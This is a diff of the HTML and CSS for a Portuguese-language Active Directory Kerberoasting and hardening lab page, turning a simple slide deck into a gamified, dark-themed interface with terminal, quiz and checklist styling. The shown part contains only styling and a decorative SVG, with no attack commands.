@@ -1,584 +1,2328 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Lab Kerberoasting e Hardening</title>
-  <style>
-    :root {
-      --bg: #f7f8fb;
-      --panel: #ffffff;
-      --text: #111827;
-      --muted: #4b5563;
-      --line: #d7dce5;
-      --accent: #0f766e;
-      --danger: #b91c1c;
-      --code: #0f172a;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Operação Kerberos | Lab de Segurança AD</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;700&display=swap');
 
-    * {
-      box-sizing: border-box;
-    }
+  :root {
+    --bg:       #0b0e17;
+    --bg2:      #111524;
+    --bg3:      #181d2e;
+    --border:   #2a3050;
+    --gold:     #c9a84c;
+    --gold2:    #e8c96a;
+    --red:      #e05555;
+    --green:    #4ecb71;
+    --blue:     #4a8fe8;
+    --purple:   #9b6ee8;
+    --text:     #d8dff5;
+    --muted:    #7a85aa;
+    --phase-locked: #1a1f30;
+  }
 
-    html,
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { overflow-x: hidden; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 15px;
+    line-height: 1.65;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ── STARS ── */
+  #stars {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background:
+      radial-gradient(ellipse 80% 40% at 50% 0%, #1a2040 0%, transparent 70%);
+  }
+  #stars::before, #stars::after {
+    content: '';
+    position: absolute; inset: 0;
+    background-image:
+      radial-gradient(1px 1px at 10% 15%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 25% 45%, #fff 0%, transparent 100%),
+      radial-gradient(1.5px 1.5px at 40% 8%, #c9a84c 0%, transparent 100%),
+      radial-gradient(1px 1px at 60% 30%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 75% 12%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 85% 55%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 92% 22%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 5% 70%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 55% 65%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 30% 80%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 70% 78%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 48% 52%, #fff 0%, transparent 100%);
+    opacity: .55;
+  }
+  #stars::after {
+    background-image:
+      radial-gradient(1px 1px at 18% 35%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 33% 60%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 52% 20%, #fff 0%, transparent 100%),
+      radial-gradient(1.5px 1.5px at 66% 48%, #4a8fe8 0%, transparent 100%),
+      radial-gradient(1px 1px at 80% 35%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 88% 68%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 12% 90%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 45% 88%, #fff 0%, transparent 100%),
+      radial-gradient(1px 1px at 95% 85%, #fff 0%, transparent 100%);
+    opacity: .4;
+    animation: twinkle 6s ease-in-out infinite alternate;
+  }
+  @keyframes twinkle { from { opacity: .3; } to { opacity: .6; } }
+
+  /* ── WRAPPER ── */
+  .wrap { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; padding: 0 20px; }
+
+  /* ── HERO ── */
+  #hero {
+    padding: 80px 20px 60px;
+    text-align: center;
+    position: relative;
+    z-index: 1;
+  }
+  .castle-svg { display: block; margin: 0 auto 24px; width: 120px; opacity: .9; }
+  .eyebrow {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: .2em;
+    text-transform: uppercase;
+    color: var(--gold);
+    margin-bottom: 14px;
+  }
+  h1 {
+    font-family: 'Cinzel', serif;
+    font-size: 3.6rem;
+    font-weight: 900;
+    line-height: 1.1;
+    color: #fff;
+    text-shadow: 0 0 40px rgba(201,168,76,.35);
+    margin-bottom: 16px;
+  }
+  h1 span { color: var(--gold); }
+  .hero-sub {
+    max-width: 580px;
+    margin: 0 auto 36px;
+    color: var(--muted);
+    font-size: 15px;
+  }
+
+  /* ── PROGRESS ── */
+  .progress-bar-wrap {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    height: 8px;
+    width: 100%;
+    max-width: 500px;
+    margin: 0 auto 8px;
+    overflow: hidden;
+  }
+  #progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--gold), var(--gold2));
+    border-radius: 20px;
+    width: 0%;
+    transition: width .5s ease;
+  }
+  .progress-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: .1em;
+  }
+  .reset-progress {
+    margin-top: 14px;
+    padding: 7px 12px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    background: var(--bg2);
+    color: var(--muted);
+    cursor: pointer;
+    font: 10px 'JetBrains Mono', monospace;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+  }
+  .reset-progress:hover, .reset-progress:focus-visible {
+    color: var(--gold2);
+    border-color: var(--gold);
+    outline: 0;
+  }
+
+  /* ── NAV PHASES ── */
+  #phase-nav {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin: 40px 0 10px;
+    padding: 0 20px;
+    position: relative;
+    z-index: 1;
+  }
+  .phase-btn {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    padding: 6px 14px;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+    background: var(--bg2);
+    color: var(--muted);
+    cursor: pointer;
+    transition: all .2s;
+    letter-spacing: .05em;
+  }
+  .phase-btn.active { border-color: var(--gold); color: var(--gold); background: rgba(201,168,76,.08); }
+  .phase-btn.done { border-color: var(--green); color: var(--green); background: rgba(78,203,113,.07); }
+  .phase-btn.locked { opacity: .35; cursor: not-allowed; }
+
+  /* ── PHASE SECTIONS ── */
+  .phase {
+    display: none;
+    animation: fadeUp .4s ease;
+  }
+  .phase.active { display: block; }
+  @keyframes fadeUp { from { opacity:0; transform: translateY(12px); } to { opacity:1; transform:none; } }
+
+  .phase-header {
+    padding: 50px 0 30px;
+    text-align: center;
+  }
+  .phase-number {
+    font-family: 'Cinzel', serif;
+    font-size: 11px;
+    letter-spacing: .25em;
+    color: var(--gold);
+    text-transform: uppercase;
+    margin-bottom: 10px;
+  }
+  h2 {
+    font-family: 'Cinzel', serif;
+    font-size: 2.2rem;
+    color: #fff;
+    margin-bottom: 12px;
+  }
+  .phase-desc { color: var(--muted); max-width: 560px; margin: 0 auto; }
+
+  /* ── CARDS ── */
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 24px 28px;
+    margin-bottom: 16px;
+  }
+  .card-title {
+    font-family: 'Cinzel', serif;
+    font-size: 13px;
+    color: var(--gold);
+    letter-spacing: .08em;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .card-title .icon { font-size: 18px; }
+
+  /* ── ANALOGY BOX ── */
+  .analogy {
+    background: linear-gradient(135deg, rgba(74,143,232,.07), rgba(155,110,232,.05));
+    border: 1px solid rgba(74,143,232,.25);
+    border-left: 3px solid var(--blue);
+    border-radius: 8px;
+    padding: 20px 24px;
+    margin: 20px 0;
+  }
+  .analogy-title {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--blue);
+    letter-spacing: .15em;
+    text-transform: uppercase;
+    margin-bottom: 10px;
+  }
+
+  /* ── FLOW DIAGRAM ── */
+  .flow {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin: 24px 0;
+  }
+  .flow-step {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px 16px;
+    font-size: 13px;
+    text-align: center;
+    min-width: 120px;
+    position: relative;
+  }
+  .flow-step .fs-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--muted); display: block; margin-bottom: 4px; }
+  .flow-step .fs-name { font-weight: 600; color: #fff; }
+  .flow-arrow {
+    font-size: 18px;
+    color: var(--gold);
+    padding: 0 6px;
+    flex-shrink: 0;
+  }
+  .flow-step.red { border-color: rgba(224,85,85,.4); }
+  .flow-step.red .fs-name { color: var(--red); }
+  .flow-step.green { border-color: rgba(78,203,113,.4); }
+  .flow-step.green .fs-name { color: var(--green); }
+  .flow-step.gold { border-color: rgba(201,168,76,.4); }
+  .flow-step.gold .fs-name { color: var(--gold); }
+
+  /* ── TERMINAL ── */
+  .terminal {
+    background: #080c12;
+    border: 1px solid #1e2a3a;
+    border-radius: 8px;
+    overflow: hidden;
+    margin: 20px 0;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+  }
+  .terminal-bar {
+    background: #111827;
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    border-bottom: 1px solid #1e2a3a;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dot.r { background: #e05555; }
+  .dot.y { background: #c9a84c; }
+  .dot.g { background: #4ecb71; }
+  .terminal-title { font-size: 11px; color: var(--muted); margin-left: 4px; letter-spacing: .05em; }
+  .terminal-body { padding: 18px 20px; line-height: 1.8; }
+  .t-comment { color: #4a5568; }
+  .t-cmd { color: var(--gold2); }
+  .t-out { color: #8892b0; }
+  .t-ok { color: var(--green); }
+  .t-err { color: var(--red); }
+  .t-prompt { color: var(--purple); }
+  .t-highlight { color: var(--gold); font-weight: 700; }
+
+  /* ── INTERACTIVE TERMINAL ── */
+  .i-terminal { cursor: text; }
+  .i-terminal .terminal-body { min-height: 160px; }
+  .t-input-line { display: flex; align-items: center; margin-top: 6px; }
+  .t-input {
+    background: none;
+    border: none;
+    outline: none;
+    color: var(--gold2);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    flex: 1;
+    caret-color: var(--gold);
+  }
+
+  /* ── RISK BADGE ── */
+  .risk-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 3px 10px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-family: 'JetBrains Mono', monospace;
+    letter-spacing: .05em;
+    font-weight: 700;
+  }
+  .risk-critical { background: rgba(224,85,85,.15); border: 1px solid rgba(224,85,85,.3); color: var(--red); }
+  .risk-medium   { background: rgba(201,168,76,.12); border: 1px solid rgba(201,168,76,.3); color: var(--gold); }
+  .risk-ok       { background: rgba(78,203,113,.12); border: 1px solid rgba(78,203,113,.3); color: var(--green); }
+
+  /* ── CHECKLIST ── */
+  .checklist { list-style: none; display: flex; flex-direction: column; gap: 10px; }
+  .checklist li {
+    display: flex; align-items: flex-start; gap: 12px;
+    background: var(--bg3); border: 1px solid var(--border);
+    border-radius: 8px; padding: 12px 16px; cursor: pointer;
+    transition: border-color .2s;
+  }
+  .checklist li:hover { border-color: var(--gold); }
+  .checklist li.checked { border-color: rgba(78,203,113,.4); background: rgba(78,203,113,.04); }
+  .check-box {
+    width: 20px; height: 20px; border-radius: 4px; border: 2px solid var(--border);
+    flex-shrink: 0; display: flex; align-items: center; justify-content: center;
+    font-size: 13px; transition: all .2s; margin-top: 1px;
+  }
+  .checklist li.checked .check-box { background: var(--green); border-color: var(--green); color: #000; }
+  .check-text { flex: 1; }
+  .check-title { font-weight: 600; color: #fff; margin-bottom: 2px; }
+  .check-sub { font-size: 12px; color: var(--muted); }
+
+  /* ── QUIZ ── */
+  .quiz-q { font-weight: 600; color: #fff; margin-bottom: 14px; font-size: 15px; }
+  .quiz-opts { display: flex; flex-direction: column; gap: 8px; }
+  .quiz-opt {
+    background: var(--bg3); border: 1px solid var(--border);
+    border-radius: 8px; padding: 12px 16px;
+    cursor: pointer; transition: all .2s;
+    font-size: 14px;
+  }
+  .quiz-opt:hover { border-color: var(--blue); }
+  .quiz-opt.correct { border-color: var(--green); background: rgba(78,203,113,.08); color: var(--green); }
+  .quiz-opt.wrong { border-color: var(--red); background: rgba(224,85,85,.08); color: var(--red); }
+  .quiz-feedback {
+    margin-top: 14px; padding: 12px 16px;
+    border-radius: 8px; font-size: 13px;
+    display: none;
+  }
+  .quiz-feedback.show { display: block; }
+  .quiz-feedback.ok { background: rgba(78,203,113,.1); border: 1px solid rgba(78,203,113,.3); color: var(--green); }
+  .quiz-feedback.fail { background: rgba(224,85,85,.1); border: 1px solid rgba(224,85,85,.3); color: var(--red); }
+
+  /* ── CTA BUTTON ── */
+  .btn-next {
+    display: block;
+    margin: 30px auto 0;
+    padding: 13px 36px;
+    background: linear-gradient(135deg, #b8922a, #c9a84c);
+    color: #0b0e17;
+    font-family: 'Cinzel', serif;
+    font-weight: 700;
+    font-size: 13px;
+    letter-spacing: .1em;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: all .2s;
+    text-transform: uppercase;
+  }
+  .btn-next:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(201,168,76,.3); }
+  .btn-next:disabled { opacity: .35; cursor: not-allowed; transform: none; box-shadow: none; }
+
+  /* ── DIVIDER ── */
+  .divider {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+    margin: 32px 0;
+  }
+
+  /* ── VICTORY ── */
+  #phase-victory { text-align: center; }
+  .victory-icon { font-size: 64px; margin-bottom: 24px; animation: pulse 2s ease-in-out infinite; }
+  @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
+  .victory-badge {
+    display: inline-block;
+    border: 2px solid var(--gold);
+    border-radius: 12px;
+    padding: 24px 40px;
+    margin: 24px 0;
+    background: rgba(201,168,76,.06);
+  }
+  .victory-badge h3 { font-family: 'Cinzel', serif; font-size: 1.3rem; color: var(--gold2); margin-bottom: 6px; }
+  .victory-badge p { color: var(--muted); font-size: 13px; }
+
+  /* ── TABLE ── */
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px; letter-spacing: .12em; text-transform: uppercase;
+    color: var(--muted); padding: 10px 14px; text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+  td { padding: 10px 14px; border-bottom: 1px solid rgba(42,48,80,.5); vertical-align: top; }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(255,255,255,.02); }
+
+  /* ── CHARACTER PANEL ── */
+  .chars {
+    display: flex;
+    gap: 12px;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin: 24px 0;
+  }
+  .char-card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px;
+    text-align: center;
+    width: 130px;
+    transition: border-color .2s;
+  }
+  .char-card:hover { border-color: var(--gold); }
+  .char-icon { font-size: 36px; margin-bottom: 8px; }
+  .char-name { font-family: 'Cinzel', serif; font-size: 12px; color: var(--gold); margin-bottom: 4px; }
+  .char-role { font-size: 11px; color: var(--muted); }
+
+  /* EVIDÊNCIAS REAIS DO LAB */
+  .evidence-section { margin: 22px 0; }
+  .evidence-heading {
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--gold2);
+    font-size: 11px;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+  }
+  .evidence-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 12px;
+  }
+  .evidence-card {
+    margin: 0;
+    padding: 10px;
+    background: #080c12;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+  }
+  .evidence-card img {
+    display: block;
+    width: 100%;
+    aspect-ratio: 16 / 9;
+    object-fit: contain;
+    background: #030507;
+    border: 1px solid #1e2a3a;
+    cursor: zoom-in;
+  }
+  .evidence-card img:focus-visible {
+    outline: 3px solid var(--gold);
+    outline-offset: 2px;
+  }
+  .evidence-card figcaption {
+    padding: 10px 4px 2px;
+    color: var(--muted);
+    font-size: 12px;
+    line-height: 1.45;
+  }
+
+  /* TERMINAL GUIADO */
+  .mission-terminal .terminal-body {
+    min-height: 220px;
+    max-height: 460px;
+    overflow: auto;
+  }
+  .mission-log {
+    white-space: pre-wrap;
+    overflow-wrap: anywhere;
+    color: #aab5d1;
+    line-height: 1.55;
+  }
+  .mission-input-row {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-top: 12px;
+    padding-top: 10px;
+    border-top: 1px solid #1e2a3a;
+  }
+  .mission-input-row .t-input { min-width: 0; }
+  .mission-status {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 7px;
+    margin-top: 10px;
+  }
+  .mission-chip {
+    padding: 5px 8px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--muted);
+    font: 10px/1.35 'JetBrains Mono', monospace;
+  }
+  .mission-chip.done {
+    color: var(--green);
+    border-color: rgba(78,203,113,.45);
+    background: rgba(78,203,113,.07);
+  }
+  .terminal-actions {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-top: 10px;
+  }
+  .term-action {
+    padding: 7px 11px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    background: var(--bg3);
+    color: var(--gold2);
+    cursor: pointer;
+    font: 11px 'JetBrains Mono', monospace;
+  }
+  .term-action:hover, .term-action:focus-visible {
+    border-color: var(--gold);
+    outline: 0;
+  }
+
+  /* VISUALIZADOR DE EVIDÊNCIAS */
+  body.viewer-open { overflow: hidden; }
+  .evidence-viewer {
+    position: fixed;
+    inset: 0;
+    z-index: 1000;
+    display: grid;
+    grid-template-rows: auto minmax(0, 1fr) auto;
+    background: rgba(4, 6, 11, .97);
+  }
+  .evidence-viewer[hidden] { display: none; }
+  .viewer-toolbar {
+    min-height: 58px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    padding: 10px 16px;
+    background: var(--bg2);
+    border-top: 3px solid var(--gold);
+    border-bottom: 1px solid var(--border);
+  }
+  .viewer-title {
+    min-width: 0;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    color: #fff;
+    font: 700 12px 'JetBrains Mono', monospace;
+  }
+  .viewer-controls { display: flex; gap: 6px; align-items: center; flex: 0 0 auto; }
+  .viewer-control, .viewer-percent {
+    width: 38px;
+    height: 36px;
+    display: grid;
+    place-items: center;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    background: var(--bg3);
+    color: var(--text);
+    font: 700 18px/1 'JetBrains Mono', monospace;
+  }
+  .viewer-control { cursor: pointer; }
+  .viewer-control:hover, .viewer-control:focus-visible { border-color: var(--gold); outline: 0; }
+  .viewer-control:disabled { opacity: .35; cursor: not-allowed; }
+  .viewer-percent { width: 62px; color: var(--gold2); font-size: 11px; }
+  .viewer-stage {
+    min-width: 0;
+    min-height: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: auto;
+    padding: 22px;
+    background: #030507;
+  }
+  .viewer-image {
+    display: block;
+    max-width: 90vw;
+    max-height: 78vh;
+    width: auto;
+    height: auto;
+    transform-origin: center;
+    transition: transform .15s ease;
+  }
+  .viewer-caption {
+    min-height: 48px;
+    padding: 12px 18px;
+    color: var(--muted);
+    background: var(--bg2);
+    border-top: 1px solid var(--border);
+    font-size: 12px;
+  }
+
+  /* ── RESPONSIVE ── */
+  @media (max-width: 900px) {
+    h1 { font-size: 2.8rem; }
+    h2 { font-size: 1.95rem; }
+    #hero { padding-top: 58px; }
+  }
+
+  @media (max-width: 600px) {
     body {
-      margin: 0;
-      min-height: 100%;
-      background: var(--bg);
-      color: var(--text);
-      font-family: Arial, Helvetica, sans-serif;
-      letter-spacing: 0;
-      overflow: hidden;
+      font-size: 14px;
+      line-height: 1.55;
     }
 
-    body {
-      height: 100vh;
+    .wrap { padding: 0 12px; }
+
+    #hero {
+      padding: 38px 14px 28px;
     }
 
-    .deck {
-      width: 100vw;
-      height: 100vh;
-      position: relative;
+    .castle-svg {
+      width: 84px;
+      margin-bottom: 16px;
     }
 
-    .slide {
-      display: none;
-      width: 100vw;
-      height: 100vh;
-      padding: 3.2vh 4vw 5vh;
-      grid-template-rows: auto 1fr auto;
-      gap: 2vh;
-    }
-
-    .slide.active {
-      display: grid;
-    }
-
-    header {
-      border-bottom: 1px solid var(--line);
-      padding-bottom: 1.6vh;
-    }
-
-    .kicker {
-      color: var(--accent);
-      font-size: clamp(14px, 1.1vw, 20px);
-      font-weight: 700;
-      text-transform: uppercase;
+    .eyebrow {
+      max-width: 330px;
+      margin: 0 auto 12px;
+      font-size: 9px;
+      letter-spacing: .12em;
+      line-height: 1.5;
     }
 
     h1 {
-      margin: 0.6vh 0 0;
-      font-size: clamp(34px, 4.2vw, 72px);
-      line-height: 1.03;
-    }
-
-    h2 {
-      margin: 0.5vh 0 0;
-      font-size: clamp(26px, 2.7vw, 48px);
+      font-size: 2.05rem;
       line-height: 1.08;
-    }
-
-    p,
-    li {
-      font-size: clamp(20px, 1.65vw, 32px);
-      line-height: 1.32;
-    }
-
-    p {
-      margin: 0.8vh 0;
-      color: var(--muted);
-    }
-
-    ul {
-      margin: 1.2vh 0 0;
-      padding-left: 1.4em;
-    }
-
-    .content {
-      min-height: 0;
-      display: grid;
-      gap: 2vh;
-      align-items: center;
-    }
-
-    .split {
-      grid-template-columns: minmax(280px, 0.58fr) minmax(560px, 1.42fr);
-    }
-
-    .image-only {
-      grid-template-columns: 1fr;
-      align-items: stretch;
-    }
-
-    .evidence {
-      width: 100%;
-      height: 100%;
-      min-height: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #eef2f7;
-      border: 1px solid var(--line);
-      overflow: hidden;
-    }
-
-    .evidence img {
-      max-width: 100%;
-      max-height: 100%;
-      width: auto;
-      height: auto;
-      object-fit: contain;
-      display: block;
-    }
-
-    .evidence.fill img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
-    }
-
-    .note {
-      border-left: 8px solid var(--accent);
-      background: var(--panel);
-      padding: 2vh 2vw;
-      font-size: clamp(20px, 1.5vw, 30px);
-      line-height: 1.35;
-      color: var(--text);
-    }
-
-    .danger {
-      border-left-color: var(--danger);
-    }
-
-    .code {
-      font-family: Consolas, "Courier New", monospace;
-      font-size: clamp(17px, 1.25vw, 24px);
-      line-height: 1.35;
-      color: var(--code);
-      background: #edf0f5;
-      border: 1px solid var(--line);
-      padding: 1.4vh 1.4vw;
-      white-space: pre-wrap;
       overflow-wrap: anywhere;
     }
 
-    footer {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      color: #6b7280;
-      font-size: clamp(13px, 1vw, 18px);
-      border-top: 1px solid var(--line);
-      padding-top: 1vh;
+    h2 {
+      font-size: 1.65rem;
+      line-height: 1.15;
     }
 
-    .progress {
-      height: 5px;
-      width: 100%;
-      background: #e5e7eb;
-      position: fixed;
-      left: 0;
-      bottom: 0;
+    .hero-sub {
+      margin-bottom: 24px;
+      font-size: 14px;
+      line-height: 1.55;
     }
 
-    .bar {
-      height: 100%;
-      width: 0;
-      background: var(--accent);
-    }
+    .progress-bar-wrap { max-width: 330px; }
 
-    .controls {
-      position: fixed;
-      right: 1vw;
-      top: 1vh;
-      display: flex;
+    #phase-nav {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
       gap: 8px;
-      z-index: 10;
+      margin: 24px 0 8px;
+      padding: 0 12px;
     }
 
-    button {
-      width: 44px;
-      height: 38px;
-      border: 1px solid var(--line);
-      background: #ffffff;
-      color: var(--text);
-      font-size: 20px;
-      cursor: pointer;
+    .phase-btn {
+      width: 100%;
+      min-height: 44px;
+      padding: 8px 6px;
+      white-space: normal;
+      line-height: 1.3;
     }
 
-    @media (max-width: 900px) {
-      .slide {
-        padding: 2.5vh 4vw 5vh;
-      }
+    .phase-header { padding: 34px 0 22px; }
+    .phase-number { letter-spacing: .16em; }
+    .phase-desc { padding: 0 4px; }
 
-      .split {
-        grid-template-columns: 1fr;
-      }
+    .card {
+      padding: 15px 14px;
+      margin-bottom: 12px;
+      overflow: hidden;
     }
-  </style>
+
+    .card-title {
+      align-items: flex-start;
+      line-height: 1.4;
+    }
+
+    .analogy {
+      padding: 15px 14px;
+      margin: 14px 0;
+    }
+
+    .chars {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 8px;
+      margin: 18px 0;
+    }
+
+    .char-card {
+      width: auto;
+      min-width: 0;
+      padding: 12px 8px;
+    }
+
+    .char-icon { font-size: 28px; }
+    .char-role { overflow-wrap: anywhere; }
+
+    table {
+      display: block;
+      max-width: 100%;
+      overflow-x: auto;
+      overscroll-behavior-inline: contain;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    th, td {
+      min-width: 118px;
+      padding: 9px 10px;
+    }
+
+    code { overflow-wrap: anywhere; }
+
+    .flow {
+      flex-direction: column;
+      align-items: stretch;
+      gap: 4px;
+    }
+
+    .flow-step { width: 100%; }
+    .flow-arrow { transform: rotate(90deg); align-self: center; }
+
+    .terminal {
+      margin: 14px 0;
+      font-size: 12px;
+    }
+
+    .terminal-bar { padding: 9px 10px; }
+    .terminal-title {
+      min-width: 0;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .terminal-body {
+      padding: 13px 11px;
+      overflow-wrap: anywhere;
+    }
+
+    .mission-terminal .terminal-body {
+      min-height: 210px;
+      max-height: 390px;
+    }
+
+    .mission-input-row {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 6px;
+    }
+
+    .mission-input-row .t-prompt {
+      display: block;
+      width: 100%;
+    }
+
+    .t-input {
+      width: 100%;
+      min-height: 38px;
+      font-size: 16px;
+    }
+
+    .mission-status {
+      display: grid;
+      grid-template-columns: 1fr;
+    }
+
+    .mission-chip { overflow-wrap: anywhere; }
+
+    .terminal-actions {
+      display: grid;
+      grid-template-columns: 1fr;
+    }
+
+    .term-action {
+      width: 100%;
+      min-height: 44px;
+      white-space: normal;
+    }
+
+    .btn-next {
+      width: 100%;
+      min-height: 48px;
+      margin-top: 22px;
+      padding: 12px 14px;
+      white-space: normal;
+      line-height: 1.35;
+    }
+
+    .checklist li { padding: 11px 10px; }
+    .check-title, .check-sub { overflow-wrap: anywhere; }
+
+    .victory-badge {
+      width: 100%;
+      padding: 18px 12px;
+    }
+
+    .evidence-grid { grid-template-columns: 1fr; }
+    .evidence-card { padding: 8px; }
+    .evidence-card img { aspect-ratio: 4 / 3; }
+    .evidence-card figcaption { padding-top: 9px; }
+
+    .viewer-toolbar { padding: 8px; gap: 7px; }
+    .viewer-title { max-width: calc(100vw - 205px); font-size: 10px; }
+    .viewer-controls { gap: 4px; }
+    .viewer-control { width: 34px; }
+    .viewer-percent { width: 50px; }
+    .viewer-stage { padding: 10px; }
+    .viewer-image { max-width: 94vw; max-height: 72vh; }
+    .viewer-caption { padding: 10px 12px; }
+  }
+
+  @media (max-width: 340px) {
+    #phase-nav { grid-template-columns: 1fr; }
+    h1 { font-size: 1.82rem; }
+    .chars { grid-template-columns: 1fr; }
+    .viewer-title { display: none; }
+  }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+  /* highlight pulse on unlock */
+  @keyframes borderPulse {
+    0%   { box-shadow: 0 0 0 0 rgba(201,168,76,.5); }
+    70%  { box-shadow: 0 0 0 10px rgba(201,168,76,0); }
+    100% { box-shadow: 0 0 0 0 rgba(201,168,76,0); }
+  }
+  .just-unlocked { animation: borderPulse .8s ease; }
+
+  button, [role="button"] { touch-action: manipulation; }
+</style>
 </head>
 <body>
-  <div class="controls" aria-label="Controles">
-    <button id="prev" title="Slide anterior">‹</button>
-    <button id="next" title="Proximo slide">›</button>
+
+<div id="stars"></div>
+
+<!-- ════════════════ HERO ════════════════ -->
+<div id="hero">
+  <svg class="castle-svg" viewBox="0 0 120 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <rect x="10" y="40" width="20" height="55" fill="#1e2540" stroke="#c9a84c" stroke-width="1.5"/>
+    <rect x="90" y="40" width="20" height="55" fill="#1e2540" stroke="#c9a84c" stroke-width="1.5"/>
+    <rect x="30" y="50" width="60" height="45" fill="#1e2540" stroke="#c9a84c" stroke-width="1.5"/>
+    <!-- merlons left -->
+    <rect x="10" y="30" width="7" height="12" fill="#c9a84c"/>
+    <rect x="21" y="30" width="7" height="12" fill="#c9a84c"/>
+    <!-- merlons right -->
+    <rect x="90" y="30" width="7" height="12" fill="#c9a84c"/>
+    <rect x="101" y="30" width="7" height="12" fill="#c9a84c"/>
+    <!-- merlons center -->
+    <rect x="30" y="38" width="7" height="14" fill="#c9a84c"/>
+    <rect x="42" y="38" width="7" height="14" fill="#c9a84c"/>
+    <rect x="54" y="38" width="7" height="14" fill="#c9a84c"/>
+    <rect x="66" y="38" width="7" height="14" fill="#c9a84c"/>
+    <rect x="78" y="38" width="7" height="14" fill="#c9a84c"/>
+    <!-- gate -->
+    <rect x="48" y="72" width="24" height="23" rx="12" fill="#0b0e17" stroke="#c9a84c" stroke-width="1.5"/>
+    <!-- windows -->
+    <rect x="18" y="55" width="8" height="10" rx="4" fill="#4a8fe8" opacity=".7"/>
+    <rect x="94" y="55" width="8" height="10" rx="4" fill="#4a8fe8" opacity=".7"/>
+    <!-- flag -->
